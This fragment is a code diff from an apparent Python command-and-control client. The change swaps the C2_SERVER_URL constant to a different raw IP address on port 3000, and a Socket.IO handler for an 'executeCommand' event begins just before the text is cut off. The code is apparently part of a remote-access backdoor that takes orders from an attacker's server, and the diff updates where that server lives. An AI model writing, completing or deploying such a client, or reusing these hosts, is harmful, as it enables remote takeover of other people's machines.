@@ -4,7 +4,7 @@ import os
 import requests
 
 sio = socketio.Client()
-C2_SERVER_URL = 'http://172.93.163.140:3000'
+C2_SERVER_URL = 'http://66.154.177.23:3000'
 
 @sio.on('executeCommand')
 def on_command(command):
